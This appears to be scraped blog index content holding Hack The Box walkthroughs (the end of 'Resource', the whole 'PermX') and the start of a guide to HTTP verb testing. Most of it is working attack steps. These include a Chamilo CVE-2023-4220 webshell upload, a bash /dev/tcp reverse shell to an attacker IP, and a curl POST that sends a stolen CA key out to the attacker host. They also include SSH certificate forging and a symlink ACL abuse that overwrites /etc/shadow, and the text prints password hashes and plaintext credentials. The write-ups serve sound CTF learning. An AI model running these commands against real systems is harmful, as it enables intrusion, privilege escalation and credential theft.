# Generate a keypair ssh-keygen -t rsa -b 4096 -f ssg_root -N birb09876 # Serve the pubkey to the target, using http cd ../www cp ../keys/ssg_root.pub ./ cp ../exploit/privesc/read_ca-it.py ./ simple-server 8000 -v On the target host (ssg), download the exploit script and the pubkey:
We could actually use any valid OpenSSH key. This one is just a placeholder to pass to the /opt/sign_key.sh script.
mkdir -p /tmp/.Tools &amp;&amp; cd /tmp/.Tools curl -O http://10.10.14.5:8000/ssg_root.pub curl -O http://10.10.14.5:8000/read_ca-it.py chmod +x read_ca-it.py With the files in place, run the exploit script. Once it&rsquo;s done, exfiltrate the copy of ca-it that we generate. To avoid spoiling the box for others, clean up behind ourselves:
# Run the script. It takes a few minutes python3 read_ca-it.py # Upload the result to the attacker (or just copy-paste) curl -X POST -F &#39;file=@my_test_ca_file&#39; http://10.10.14.5:8000 rm -rf /tmp/.Tools Use the CA cert that we generated to sign the pubkey from the root user keypair that we made earlier:
Note that the serial number 12345 is totally arbitrary. All the other args need to match how I&rsquo;ve shown it here, though &#x1f447;
mv my_test_ca_file ca-it vim ca-it # There was an extra byte on the end, clean it up chmod 0600 ca-it # Sign the key using the CA cert we just obtained ssh-keygen -s &#34;ca-it&#34; -z &#34;12345&#34; -I &#34;root&#34; -V -1w:forever -n &#34;root_user&#34; &#34;ssg_root.pub&#34; This will sign the pubkey, creating a new file ssg_root-cert.pub. After restricting the file permissions, we can use the private key ssg_root and the signed pubkey ssg_root-cert.pub to log in as the root user:
# Copy over the root ssh key too cp ../keys/ssg_root ./ chmod 0600 ssg_root ssh -p 2222 -i ./ssg_root -i ssg_root-cert.pub root@$RADDR That&rsquo;s all there is to it! We can see the root flag in the usual spot. cat the flag to finish off the box:
cat /root/root.txt CLEANUP Target On the itrc host, I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools I already did this on the ssg host.
Attacker It&rsquo;s a good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; There&rsquo;s also a few entries to clean up in my hosts file:
sudo vim /etc/hosts LESSONS LEARNED Attacker &#x1f937;&zwj;&#x2642;&#xfe0f; Dont&rsquo; feel too bad about checking the forums early. It can be a very productive sanity-check. Early on in this box, during Recon, I wasted nearly 2 hours persuing the regreSSHion vulnerability. Why was I so fixated on this one vulnerability? Well, because my instance kept starting up without any HTTP running! All I was seeing were ports 22 and 2222, so naturally I assumed that the foothold would be one of the SSH services.
&#x1f418; PHP stream wrappers are an easy target. On this box, we utilized the phar:// wrapper to &ldquo;peek inside&rdquo; a zip file and execute the PHP code within. I find it a little crazy that it&rsquo;s even possible to do that. I&rsquo;ll definitely be remembering this trick for next time I find a file upload feature of a PHP-based web app. Even though we used a reverse shell, we could have just as easily used a webshell.
&#x23;&#xfe0f;&#x20e3; Custom bash scripts are almost always the privesc vector. It is notoriously difficult to write secure bash scripts. On this box, we abused the fact that the author accidentally wrote an == comparison backwards: if they had exchanged the lefthand side and righthand side, that clause would have been secure. As an attacker, always pay extra attention to custom bash scripts.
Defender &#x1f525; Dear PHP, I love you but you&rsquo;re a dumpster fire. It&rsquo;s a very convenient language for easily building a funcitonal web application, but it&rsquo;s also full of holes an bypasses. I think developers should gravitate towards more &ldquo;secure by default&rdquo; server-side languages when developing web apps.
&#x1f3f9; Clean up orphaned entities. On this box, zzinter had already deleted their SSH keys for the ssg host. So&hellip; why did they still have an account on that host? And why did that account still have sudo privileges? I understand that they were in a time of transition for handling their certificate management, but this is no excuse for IT sloppiness.
`,url:"https://4wayhandshake.github.io/walkthrough/resource/"},"https://4wayhandshake.github.io/walkthrough/permx/":{title:"PermX",tags:["Chamilo","Insecure Upload","Symlink"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION PermX is about exploiting a learning management system called Chamilo. The box was pretty easy, and shouldn&rsquo;t take long to finish.
Recon mostly involves uncovering a couple subdomains. One of them is the usual, obvious subdomain, but the other is a bit more odd. Accessing the &ldquo;more odd&rdquo; subdomain allows you to know the name of the CMS you&rsquo;re up against. Applying a little directory enumeration will reveal that you can actually access several directories in &ldquo;file browser&rdquo; mode, basically eliminating the need to do any file enumeration. One of these files will reveal the exact version of the CMS.
With the CMS fully identified, a little bit of vulnerability &amp; exploit research will bring you to a premade exploit involving arbitrary file upload. Use this to upload a webshell to gain yourself an easy foothold. At this point, it&rsquo;s convenient to turn the webshell into a reverse shell.
Local enumeration is pretty simple. Poking around the webserver directory will yield the database connection, and a simple keyword search on the filesystem will show some plaintext credentials (I think even Linpeas would find it). Utilize this to gain yourself a nice SSH connection.
The path towards the root flag is a little more obscure, but still very simple once you find it. It&rsquo;s so simple that I can&rsquo;t really write any more without spoiling it outright. My only advice is: remember to try some other privileged files, other than the root flag!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA) |_ 256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://permx.htb Only SSH and HTTP. Note the redirect to http://permx.htb.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 123/udp open|filtered ntp 138/udp open|filtered tcpwrapped 515/udp open|filtered tcpwrapped 996/udp open|filtered tcpwrapped 998/udp open|filtered tcpwrapped 1433/udp open|filtered tcpwrapped 1434/udp open|filtered ms-sql-m 1719/udp open|filtered h323gatestat 2222/udp open|filtered tcpwrapped 2223/udp open|filtered tcpwrapped 4500/udp open|filtered tcpwrapped Note that any open|filtered ports are either open or (much more likely) filtered.
We see NTP (which lots of network-connected things might run), MSSQL (database), and H.323 (for audio/video calls). I&rsquo;ll refrain from guessing what the device is, but this is certainly an odd combination for a webserver.
Webserver Strategy Noting the redirect from the nmap scan, I added permx.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=permx.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR That all looks pretty normal. That&rsquo;s a recent version of Apache; all the contact info is in order.
Exploring the Website The website seems like it&rsquo;s for an eLearning platform, offering courses in various subjects like web design and programming. However, the site itself seems like it&rsquo;s little more than a template. The only interactible element is the contact form, but it&rsquo;s not hooked up yet. There are student testimonials, but they don&rsquo;t link to anything, etc.
There must be another target. I&rsquo;ll start scanning.
Enumeration Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No other domains resulted from this scan. Now I&rsquo;ll check for subdomains of permx.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v There we go. I&rsquo;ll add these to my /etc/hosts and check them out.
echo &#34;$RADDR www.$DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR lms.$DOMAIN&#34; | sudo tee -a /etc/hosts WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; for SUBDOMAIN in www lms; do ffuf -w $WLIST:FUZZ -u http://$SUBDOMAIN.$DOMAIN/FUZZ -t 60 -c -o &#34;ffuf-directories-$SUBDOMAIN&#34; -of json -e .php,.html,.txt -timeout 4 -fs 278; done As expected, http://www.permx.htb appears to be the same as http://permx.htb:
However, lms had a ton of new results. I&rsquo;ll also follow up with scans of some of the directories (after I check them out manually). There are so many directories that I&rsquo;m going to avoid doing a recursive scan for now.
Navigating to http://lms.permx.htb and checking the page source reveals something like a javascript site map:
web seems to contain the usual directories that a website would. main looks like it might be a php web app. app has an upload directory, so there might be some interesting things in there.
LMS Subdomain Navigating to http://lms.permx.htb brings us to a login page, for a web app called Chamilo. We can also see that there is an administrator named Davis Miller.
Unfortunately there is no way to register a user. I tried some guessable usernames on the password reset form, but no luck.
Perusing through the results of directory enumeration, I navigated to the /app directory, which has directory listing enabled:
Inside config, there is a file parameters.yml.dist that seems like it has some database credentials in it, but they are easily guessable anyway:
parameters: database_driver: pdo_mysql database_host: 127.0.0.1 database_port: ~ database_name: chamilo111 database_user: root database_password: root # [...SNIP...] # A secret key that&#39;s used to generate certain security-related tokens secret: ThisTokenIsNotSoSecretChangeIt password_encryption: sha1 Maybe I&rsquo;ll be able to find out more about the app from the /documentation directory?
Yes, there is a changelog page at http://lms.permx.htb/documentation/changelog.html which reveals that the version of chamilo currently running is 1.11.24.
FOOTHOLD Chamilo CVEs CVE-2023-3533 A little searching revealed some recent CVEs for Chamilo. One of the results I found is an unauthenticated RCE! It&rsquo;s valid for Chamilo versions prior to 1.11.20. That&rsquo;s an earlier version of the app, but it may still be worth trying to exploit this vulnerability (it&rsquo;s an unauthenticated file upload, CVE 2023-3533).
I tried the PoC code provided here, but it reported that the target is not vulnerable:
CVE-2023-3368 I also found a related vulnerability, CVE-2023-3368, issued by the same researcher, that gains unauthenticated RCE. Like the other one, they provided a PoC python script. It is supposed to provide command execution - but I think it&rsquo;s blind, so I&rsquo;ll start up a http server:
sudo ufw allow from $RADDR to any port 8000 simple-server 8000 -v Trying out the PoC code, as indicated in the researcher&rsquo;s post:
Nope no luck (and there were no connections to my HTTP server either).
CVE-2023-4220 Thankfully, I found a list of CVEs for Chamillo that I could reference to find exactly what I needed. I searched through the list looking for CVEs that:
would apply to chamilo 1.11.24 could be performed unauthenticated could be leveraged into RCE. The first CVE in the list that meets all of the above criteria was CVE-2023-4220:
Although it has an oddly low CVSS, it seems like the best candidate. That same researcher had a post about this CVE as well. They outline a PoC that exploits this this code, in bigUpload.php:
public function postUnsupported() { $name = $_FILES[&#39;bigUploadFile&#39;][&#39;name&#39;]; $size = $_FILES[&#39;bigUploadFile&#39;][&#39;size&#39;]; $tempName = $_FILES[&#39;bigUploadFile&#39;][&#39;tmp_name&#39;]; if (filesize($tempName) &gt; $this-&gt;maxSize) { return get_lang(&#39;UplFileTooBig&#39;); } if (move_uploaded_file($tempName, $this-&gt;getMainDirectory().$name)) { return get_lang(&#39;FileUploadSucces&#39;); } else { return get_lang(&#39;UplUnableToSaveFile&#39;); } } In short, to exploit we simply perform a file upload to /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported using a body parameter name bigUploadFile for the uploaded file. I&rsquo;ll upload a simple PHP webshell:
curl -F &#39;bigUploadFile=@webshell.php&#39; &#39;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#39; The uploaded file is at /main/inc/lib/javascript/bigupload/files/webshell.php, so we can issue requests there to use it.
I&rsquo;ll prepare a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash socat -d TCP-LISTEN:4444 STDOUT My webshell is pretty unsophisticated, so I&rsquo;ll write a url-encoded command to execute to pop a reverse shell. If you&rsquo;re using a better webshell, this is probably unnecessary:
&#x1f447; I&rsquo;m using one of my own tools, url-encode, but feel free to do this however you want
url_encode &#34;bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1&#39;&#34; # bash+-c+%27sh+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.3%2F4444+0%3E%261%27 Now just send the payload to the webshell:
CMD=&#39;bash+-c+%27sh+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.3%2F4444+0%3E%261%27&#39; curl &#34;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=$CMD&#34; No response from the cURL request - typically a good sign &#x1f609;
And there&rsquo;s our reverse shell! &#x1f389;
Upgrade the shell Just to make things a little more comfortable, let&rsquo;s go ahead and upgrade our shell. For more details on how/why to do this, please feel free to read my guide.
From the reverse shell, I&rsquo;ll do this:
which python python3 perl bash # python3 is present, so use that python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;) [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 USER FLAG Local enumeration - www-data I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
There are only two important users on the box: root and mtz. www-data can only write to /var/www Useful tools on the target include nc, netcat, socat, curl, wget, python3, perl, php, tmux The only other listening services are DNS and MySQL Before looking anywhere else, I find that I often get good results from looking through the webserver configs first.
Right away, I found /var/www/chamilo/.travis.yml that shows some different database credentials than the ones we saw earlier:
However, I tried querying the database with those credentials (and the ones from earlier) and access was denied.
&#x1f4a1; I already had access to yaml files though, via the website directory listing. If there&rsquo;s any important stuff in here, it&rsquo;s probably in a PHP file. I&rsquo;ll check for config files or something that might set an environment variable.
cd /var/www/chamilo find . -iname &#34;conf*php&#34; This yielded 124 results, but one that stood out right away was the main app configuration directory, app/config. This is one of the directories we saw through the directory listing, but couldn&rsquo;t access the PHP files. I&rsquo;ll check the PHP files for the keywords &ldquo;user&rdquo; and &ldquo;pass&rdquo;:
cd app/config grep -iEH &#34;user|pass&#34; ./*.php Visually checking the results, I see some database credentials:
For convenience sake, I&rsquo;ll upload this file to read it from my local machine:
curl -F &#39;file=@configuration.php&#39; http://10.10.14.4:8000 We can see the credentials chamilo : 03F6lY3uXAP2bkW8.
Credential Reuse &#x1f397;&#xfe0f; I just found a credential, so I should check for credential re-use too
I&rsquo;m trying to get better at reminding myself to check for credential reuse as soon as I find any creds &#x1f605;
ssh mtz@$RADDR # 03F6lY3uXAP2bkW8 Yep! That worked &#x1f609;
As expected, the user flag is present at /home/mtz/user.txt, so cat it out for some points:
cat /home/mtz/user.txt ROOT FLAG Local enumeration - mtz As usual, the very first thing to do after logging into a user with a password is to check what they can sudo:
sudo -l # User mtz may run the following commands on permx: # (ALL : ALL) NOPASSWD: /opt/acl.sh Interesting. Let&rsquo;s check the contents of this acl.sh script:
#!/bin/bash if [ &#34;$#&#34; -ne 3 ]; then /usr/bin/echo &#34;Usage: $0 user perm file&#34; exit 1 fi user=&#34;$1&#34; perm=&#34;$2&#34; target=&#34;$3&#34; if [[ &#34;$target&#34; != /home/mtz/* || &#34;$target&#34; == *..* ]]; then /usr/bin/echo &#34;Access denied.&#34; exit 1 fi # Check if the path is a file if [ ! -f &#34;$target&#34; ]; then /usr/bin/echo &#34;Target must be a file.&#34; exit 1 fi /usr/bin/sudo /usr/bin/setfacl -m u:&#34;$user&#34;:&#34;$perm&#34; &#34;$target&#34; The script was clearly intended for setting ACLs on any file within /home/mtz. However, the two if clauses seem like they might not be sufficient for maintaining security!
It seems clear that we need to do some kind of ../ traversal to do anything useful with this. After all, if I had a file in the home directory, I could just set permissions on it without using the script.
But since the .. characters deny us access, I&rsquo;ll have to find another way &#x1f914;
&#x1f6ab; Wildcard tricks Since there is an explicit call to sudo within acl.sh, I&rsquo;ll need to inject a parameter within either $perm or $target.
$perm mkdir -p ~/testdir touch ~/testdir/testfile sudo /opt/acl.sh mtz &#39;rwx /opt/acl.sh&#39; &#39;/home/mtz/testdir/testfile&#39; You&rsquo;d think this would execute this line:
/usr/bin/sudo /usr/bin/setfacl -m u:mtz:rwx /opt/acl.sh /home/mtz/testdir/testfile But unfortunately, this just gives us the error setfacl: Option -m: Invalid argument near character 11
$target For this to work, I&rsquo;ll need to create a file within the home directory that has a space in it:
cd ~ touch &#39;testdir/testfile /opt/acl.sh&#39; # touch: cannot touch &#39;testdir/testfile /opt/acl.sh&#39;: No such file or directory It doesn&rsquo;t seem to accept a space in the filename that is followed by a slash&hellip;
Another thing to try would be injecting a flag/option into a filename and feeding /home/mtz/testdir/* as the path, but it turns out that setfacl doesn&rsquo;t have any options that can follow the -m {acl} option - so that idea won&rsquo;t work either.
&#x1f6ab; Filter bypass Are there any ways I can trick the &quot;$target&quot; == *..* clause?
What about URL-encoding?
sudo /opt/acl.sh mtz rwx &#39;/home/mtz/%2E./%2E./opt/acl.sh&#39; # Target must be a file Nope. Maybe I&rsquo;ll break up the .. with empty quotes?
sudo /opt/acl.sh mtz rwx /home/mtz/.&#39;&#39;./.&#39;&#39;./opt/acl.sh # Access denied Also nope.
&#x1f6ab; Command injection in filename touch &#39;testdir/test;{echo,hi}&#39; sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/test;{echo,hi}&#39; # No effect sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/*&#39; # Target must be a file. &#x2705; Using links Instead of using a relative path like .., in Linux you can freely symlink to any file. That file simply holds a predefined path and points to it.
cd testdir ln -s /opt/acl.sh lnk; sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/lnk&#39;; rm lnk # setfacl: /home/mtz/testdir/lnk: Operation not permitted Interesting. It seems to work fine on other files, though &#x1f914;
ln -s /etc/passwd lnk; sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/lnk&#39;; rm lnk That seems like an adequate proof-of-concept, no? There must be something special about /opt/acl.sh that I&rsquo;ve overlooked&hellip;
To be methodical, let&rsquo;s try a bunch of files all at once. I&rsquo;ll define a file called filelist.txt:
/root/root.txt /root/.ssh/id_rsa /opt/acl.sh /etc/shadow /etc/sudoers Then I&rsquo;ll run a script using this file:
while IFS= read -r F; do echo &#34;Trying to set ACL for $F&#34;; ln -s $F lnk; sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/lnk&#39;; ll $(realpath lnk); rm lnk; echo -e &#34;\\n&#34;; done &lt; filelist.txt The results were surprising!
&#x1f440; Two very sensitive files worked with this method: /etc/shadow and /etc/sudoers.
Now we should be able to read /etc/shadow directly:
root:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7::: ... mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7::: ... We could also edit /etc/sudoers to escalate privilege, but that would slightly &ldquo;break&rdquo; the box for other HTB users, so I prefer to just add a known password hash to /etc/shadow instead.
First, I&rsquo;ll need to generate a password hash. I&rsquo;ll do this by adding a user to my attacker machine:
sudo adduser dummy_user # password: c0nd0rzz This created a new line in my /etc/shadow file:
dummy_user:$y$j9T$onxPW9AildKDDbB4STxB6/$F.DNR1olJmtukYoG9IiYT2cwEvXZuIbj39TEKbMBc9.:19912:0:99999:7::: So I should be able to just paste this hash over the root user&rsquo;s
ln -s /etc/shadow lnk; sudo /opt/acl.sh mtz rwx &#39;/home/mtz/testdir/lnk&#39;; ll $(realpath lnk); rm lnk; vim /etc/shadow With that modified, I can simply log in with my known password:
su # c0nd0rzz Perfect - we&rsquo;re logged in as root now &#x1f601;
There&rsquo;s the flag! Just read it to finish off the box:
cat /root/root.txt EXTRA CREDIT The reset script As I was finding a way to privesc, I noticed occasionally that my links were being deleted. Also (thankfully) there was something resetting permissions on all those files I was modifying with my bash script.
The contents of /root/reset.sh show exactly what it was up to:
#!/bin/bash /usr/bin/cp /root/backup/passwd /etc/passwd /usr/bin/cp /root/backup/shadow /etc/shadow /usr/bin/cp /root/backup/sudoers /etc/sudoers /usr/bin/cp /root/backup/crontab /etc/crontab /usr/bin/setfacl -b /root/root.txt /etc/passwd /etc/shadow /etc/crontab /etc/sudoers /usr/bin/find /home/mtz -type l ! -name &#34;user.txt&#34; -mmin -3 -exec rm {} \\; This also hints that I missed another way to escalate privilege: I could have used crontab &#x1f4a1;
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools* rm -rf /home/mtz/testdir Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. I need to delete that user I added:
sudo userdel -rf dummy_user It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; Finally, I&rsquo;ll clean up my /etc/hosts file manually
sudo vim /etc/hosts `,url:"https://4wayhandshake.github.io/walkthrough/permx/"},"https://4wayhandshake.github.io/strategy/http-verb-testing/":{title:"HTTP Verb Testing",tags:["HTTP Methods","Flask","Ffuf","ZAP","Apache","Nginx","Tomcat","ASP.net","PHP"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION HTTP Verbs Every HTTP request starts with a single word. 99% of the time, it&rsquo;s either GET or POST. If you&rsquo;ve ever programmed a REST API, perhaps you&rsquo;ve also used PUT and DELETE. Here&rsquo;s the request your browser made when visiting my website:
GET https://4wayhandshake.github.io/ HTTP/1.1 host: 4wayhandshake.github.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Sec-GPC: 1 The full list of HTTP verbs is as follows:
Verb Purpose GET Read a resource POST Send some data PUT Create a new resource DELETE Delete existing resource HEAD Get just the response header, no body PATCH Partially modify a resource OPTIONS Ask the server how it wants to be communicated with CONNECT Ask to establish a tunnel to the requested resource TRACE Request the server to reply to you what you just sent it TRACK Same as TRACE Why is this important? Some websites, web apps, or APIs will handle requests in ways they don&rsquo;t intend when they&rsquo;re send requests using unexpected HTTP verbs. This can end up being a security flaw. It is important to test &ldquo;alternative&rdquo; HTTP verbs because we may be able to leverage the programming/configuration flaws into a whole slew of bypasses.
Whether it&rsquo;s due to misconfiguration or poor programming, what we&rsquo;re testing for is a scenario where protective mechanisms are applied only for certain HTTP verbs, leaving other HTTP verbs unhindered.
Flask Example Take the following terribly-written Flask server as an example. It should accept requests to /account, and only &ldquo;authenticate&rdquo; the user if the user provides one of the allowed session IDs in POST body session_id parameter:
from flask import Flask, request, jsonify HTTP_METHODS = [&#39;GET&#39;, &#39;POST&#39;, &#39;PUT&#39;, &#39;DELETE&#39;, &#39;PATCH&#39;, &#39;OPTIONS&#39;, &#39;HEAD&#39;, &#39;CONNECT&#39;, &#39;TRACE&#39;] app = Flask(__name__) # Hardcoded list of approved session IDs APPROVED_SESSION_IDS = {&#34;abc123&#34;, &#34;def456&#34;, &#34;ghi789&#34;} @app.route(&#39;/account&#39;, methods=HTTP_METHODS) def account(): session_id = request.form.get(&#39;session_id&#39;) if request.method == &#39;GET&#39;: return jsonify({&#34;error&#34;: &#34;Method not allowed. Only POST /account is allowed.&#34;}), 405 elif request.method == &#39;POST&#39;: if not session_id: return jsonify({&#34;error&#34;: &#34;Unauthorized. Must provide session_id in request body.&#34;}), 403 if session_id not in APPROVED_SESSION_IDS: return jsonify({&#34;error&#34;: &#34;Unauthorized. Session ID is not on the list.&#34;}), 403 return jsonify({&#34;message&#34;: &#34;ACCESS GRANTED. Here is all your account details&#34;}), 200 if __name__ == &#39;__main__&#39;: app.run(&#39;127.0.0.1&#39;, 8000, debug=True) Run the server locally:
python3 flask_test.py This is the intended interaction with the server:
Looks good, right? We&rsquo;ve granted access to the approved session ID, and denied it to the other one.
Let&rsquo;s try that last request again, but use an unexpected HTTP verb:
The unauthorized session ID sneaks its way through!
&#x1f644; I know, I know&hellip; this example is pretty contrived. The flawed logic is pretty obvious when you use Python.
However, the web is a diverse place, and some people are very sloppy programmers! It may seem silly, but this bug definitely exists in the wild.
TESTING Identify the scenario When do we try playing with this trick? It&rsquo;s not efficient to start spraying HTTP verbs on all over the place whenever you enumerate a target. Instead, the time to attempt something like this is when our actions are denied by some kind of security mechanism (usually something running server-side).
Examples include:
Denied SQL injection because of some regex Denied viewing account details when checking another user, via some IDOR Denied accessing an API endpoint because we didn&rsquo;t provide the right API token Using ZAP Start off by proxying a request into ZAP. The easiest way is to issue a cURL request (like in the previous section) to the server, but also include a --proxy argument. Use a request that will deny you the resource:
curl --proxy 127.0.0.1:8080 -X POST -d &#39;session_id=abc456&#39; http://127.0.0.1:8000/account Within ZAP, find the request in the History tab, right click it, and select &ldquo;&quot;Open in Requester Tab&hellip;&rdquo;. Within the requester tab, you can freely modify the request and send it again:
When testing for HTTP verbs, it&rsquo;s simplest to open a new request in the Requester tab, and copy-paste in the previous attempt. From there, you can use the Method dropdown menu to select a different HTTP verb:
Selecting a new HTTP verb may modify the request. In this case, I had to reset the content-type header for the parameter to be accepted by the server. From this, we can see that modifying the HTTP verb was enough to bypass the authorization check.
Using Ffuf Testing alternative HTTP verbs is even easier using ffuf. Seclists has a good wordlist to start with, but it is too big for our purposes, so we will only use the first 11 lines:
WLIST=http_verbs.txt head -n 11 /usr/share/seclists/Fuzzing/http-request-methods.txt &gt; http_verbs.txt ffuf -w $WLIST -u http://127.0.0.1:8000 -X FUZZ -d &#39;session_id=1337&#39; -mc all Now let&rsquo;s try every HTTP verb against the /account endpoint, providing a bogus session_id:
ffuf -w $WLIST -u http://127.0.0.1:8000/account -X FUZZ -d &#39;session_id=1337&#39; -r -c -mc all If we only want to see positive results, filter out any HTTP 405 responses, or any containing the word &ldquo;Unauthorized&rdquo;:
ffuf -w $WLIST -u http://127.0.0.1:8000/account -X FUZZ -d &#39;session_id=1337&#39; -r -c -mc all -fc 405 -fr &#39;Unauthorized&#39; I think using ffuf is a little easier than using ZAP (or Burp), as long as the request is quite simple. It&rsquo;s really easy to construct the attack, and gives results that are very easy to read.
However, if the target uses extra protective mechanisms (ex. anti-CSRF tokens), then it&rsquo;s easier to use something more fully-featured, like ZAP.
Using Python The best library to use when making any kind of web requests is requests.
Something really handy about requests is that various aspects of an HTTP request are interchangable. For example, we can easily change from a POST request to a GET request by changing this&hellip;
data = { &#39;uid&#39;: uid, &#39;username&#39;: username } reset_response = s.post(f&#39;{target}/reset.php&#39;, data=data) &hellip;into this:
data = { &#39;uid&#39;: uid, &#39;username&#39;: username } reset_response = s.get(f&#39;{target}/reset.php&#39;, params=data) I.e just exchange post for get, and exchange data for params. This effectively transforms the following HTTP request&hellip;
POST http://target.tld HTTP/1.1 uid={uid}&amp;username={username} &hellip;into this:
GET http://target.tld?uid={uid}&amp;username={username} HTTP/1.1 Super handy!
CAUSE: MISCONFIGURATION Every major http server application has some way to completely eliminate HTTP verb vulnerabilities. However, the server administrators may have inadequate knowledge of how to use them, or may misconfigure the server from sheer human error.
Even though the technologies are very hardened, once again the point of failure is the human administrator. Everybody makes mistakes; some of these mistakes manifest themselves as security vulnerabilities &#x1f601;
Next I&rsquo;ll show how four prominent types of webservers could be misconfigured to produce an HTTP verb vulnerability (and how to fix them). We&rsquo;ll cover Apache, Nginx, Tomcat, and ASP.
Apache &lt;VirtualHost *:80&gt; DocumentRoot /var/www/html &lt;Directory /var/www/html&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted &lt;/Directory&gt; &lt;/VirtualHost&gt; A client could make whatever malicious requests they want, such as DELETE index.html to deface the site:
DELETE /index.html HTTP/1.1 Host: attackme.tld We can fix this by allow-listing only our intended HTTP verbs - in this case, GET and POST. In Apache, we can use the LimitExcept clause:
&lt;VirtualHost *:80&gt; DocumentRoot /var/www/html &lt;Directory /var/www/html&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted &lt;LimitExcept GET POST&gt; Require all denied &lt;/LimitExcept&gt; &lt;/Directory&gt; &lt;/VirtualHost&gt; Only GET and POST requests will be allowed.
Nginx server { listen 80; server_name attackme.tld; root /var/www/html; } This configuration is wide open, just like the Apache example. A client could use any HTTP method maliciously - for example, they could upload a webshell:
PUT /webshell.php HTTP/1.1 Host: attackme.tld To fix this, we again invoke an allow-list for only the desired HTTP methods:
server { listen 80; server_name example.com; root /var/www/html; location / { limit_except GET POST { deny all; } } } &#x261d;&#xfe0f; I know it says deny all, but should actually still be considered an &ldquo;allow-list&rdquo; because we&rsquo;re using a limit_except clause.
